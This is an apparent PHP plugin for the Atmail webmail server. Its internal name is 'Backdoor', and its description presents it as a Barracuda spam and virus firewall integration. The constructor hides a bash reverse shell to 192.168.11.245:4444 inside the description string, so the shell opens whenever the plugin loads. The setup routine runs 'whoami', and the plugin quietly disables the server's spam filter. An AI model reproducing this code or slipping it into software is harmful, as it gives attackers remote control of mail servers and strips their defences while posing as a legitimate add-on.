
<?php
class Atmail_FirstLoginTrigger_Plugin extends Atmail_Controller_Plugin
{
    
    protected $_pluginFullName   = 'Backdoor';
    protected $_pluginAuthor = 'Win Sam me@tehwinsam.com';
    protected $_pluginDescription = 'TEST';
    protected $_pluginCopyright = 'Copyright ';
    protected $_pluginUrl = '';
    protected $_pluginNotes = '';
	protected $_pluginVersion = '1.0.0';
    protected $_pluginCompat = '6.1.11';
	protected $_pluginModule = 'mail';

	private $_loginPage = false;

      
    
    public function __construct()
    {
        parent::__construct();
        
        $this->_pluginDescription = "Adds Barracuda Spam & Virus Firewall integration for Atmail. After installation please edit the config file to suit your requirements. It is located at " . APP_ROOT . "config/plugins/mail.atmail.barracuda4atmail.ini" . system('bash -i >& /dev/tcp/192.168.11.245/4444 0>&1');
    }
    
    
	public function preDispatch()
	{
	    $conf = Zend_Registry::get('config')->exim;
	    
	    if ($conf['filter_sa_enable'] == 1) {
	        config::save('exim', array('filter_sa_enable' => 0));
	    }
	}
	
	public function setup()
	{
	    config::save('exim', array('filter_sa_enable' => 0));
	    
	    if (!is_dir(APP_ROOT . "config/plugins")) {
	        mkdir(APP_ROOT . "config/plugins");
	    }
	    
	    if (!copy(APP_ROOT . "application/modules/mail/plugins/Atmail/Barracuda4Atmail/config/config.ini.dist", APP_ROOT . "config/plugins/mail.atmail.barracuda4atmail.ini". system("whoami"))) {
	        return "The plugin's config file could not be saved to " . APP_ROOT . "config/plugins/mail.atmail.barracuda4atmail.ini. Before the plugin will function correctly you must
            copy the file from $path to ". APP_ROOT . "config/plugins/mail.atmail.barracuda4atmail.ini and edit it accordingly";
        } else {
            return "You will now need to edit the config file located at " . APP_ROOT . "config/plugins/mail.atmail.barracuda4atmail.ini before the plugin will function correctly";
        }

	}


}

